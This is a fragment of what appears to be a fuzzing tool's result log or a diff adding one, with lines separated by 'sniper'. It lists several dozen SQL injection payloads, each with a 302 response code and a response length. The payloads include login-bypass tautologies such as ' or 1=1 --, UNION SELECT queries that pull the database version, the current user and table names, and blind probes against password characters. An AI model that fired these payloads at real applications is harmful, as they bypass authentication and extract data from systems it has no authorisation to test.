+350sniper2sniper" or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+351sniper2sniper" or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+352sniper2sniper" or 1=1 --sniper302sniperfalsesniperfalsesniper1640sniper
+353sniper2sniper" or 1=1 –sniper302sniperfalsesniperfalsesniper1640sniper
+354sniper2sniper" or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+355sniper2sniper" or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+356sniper2sniper" or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+357sniper2sniper" or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+358sniper2sniper") or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+359sniper2sniper") or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+360sniper2sniper") or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+361sniper2sniper") or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+362sniper2sniper") or ("1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+363sniper2sniper") or ("1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+364sniper2sniper") or ("1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+365sniper2sniper") or ("1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+366sniper2sniper) or '1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+367sniper2sniper) or ('1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+368sniper2sniper' or 1=1 LIMIT 1;#sniper302sniperfalsesniperfalsesniper1640sniper
+369sniper2sniper'or 1=1 or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+370sniper2sniper"or 1=1 or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+371sniper2sniper' or 'a'='asniper302sniperfalsesniperfalsesniper1640sniper
+372sniper2sniper' or a=a--sniper302sniperfalsesniperfalsesniper1640sniper
+373sniper2sniper' or a=a–sniper302sniperfalsesniperfalsesniper1640sniper
+374sniper2sniper') or ('a'='asniper302sniperfalsesniperfalsesniper1640sniper
+375sniper2sniper" or "a"="asniper302sniperfalsesniperfalsesniper1640sniper
+376sniper2sniper") or ("a"="asniper302sniperfalsesniperfalsesniper1640sniper
+377sniper2sniper') or ('a'='a and hi") or ("a"="asniper302sniperfalsesniperfalsesniper1640sniper
+378sniper2sniper' or 'one'='onesniper302sniperfalsesniperfalsesniper1640sniper
+379sniper2sniper' or 'one'='one–sniper302sniperfalsesniperfalsesniper1640sniper
+380sniper2sniper' or uid like '%sniper302sniperfalsesniperfalsesniper1640sniper
+381sniper2sniper' or uname like '%sniper302sniperfalsesniperfalsesniper1640sniper
+382sniper2sniper' or userid like '%sniper302sniperfalsesniperfalsesniper1640sniper
+383sniper2sniper' or user like '%sniper302sniperfalsesniperfalsesniper1640sniper
+384sniper2sniper' or username like '%sniper302sniperfalsesniperfalsesniper1640sniper
+385sniper2sniper' or 'x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+386sniper2sniper') or ('x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+387sniper2sniper" or "x"="xsniper302sniperfalsesniperfalsesniper1640sniper
+388sniper2sniper' OR 'x'='x'#;sniper302sniperfalsesniperfalsesniper1640sniper
+389sniper2sniper'=' 'or' and '=' 'or'sniper302sniperfalsesniperfalsesniper1640sniper
+390sniper2sniper' UNION ALL SELECT 1, @@version;#sniper302sniperfalsesniperfalsesniper1640sniper
+391sniper2sniper' UNION ALL SELECT system_user(),user();#sniper302sniperfalsesniperfalsesniper1640sniper
+392sniper2sniper' UNION select table_schema,table_name FROM information_Schema.tables;#sniper302sniperfalsesniperfalsesniper1640sniper
+393sniper2sniperadmin' and substring(password/text(),1,1)='7sniper302sniperfalsesniperfalsesniper1640sniper
+394sniper2sniper' and substring(password/text(),1,1)='7sniper302sniperfalsesniperfalsesniper1640sniper
+395sniper2sniper' or 1=1 limit 1 -- -+sniper302sniperfalsesniperfalsesniper1640sniper
+396sniper2sniper'="or'sniper302sniperfalsesniperfalsesniper1640sniper
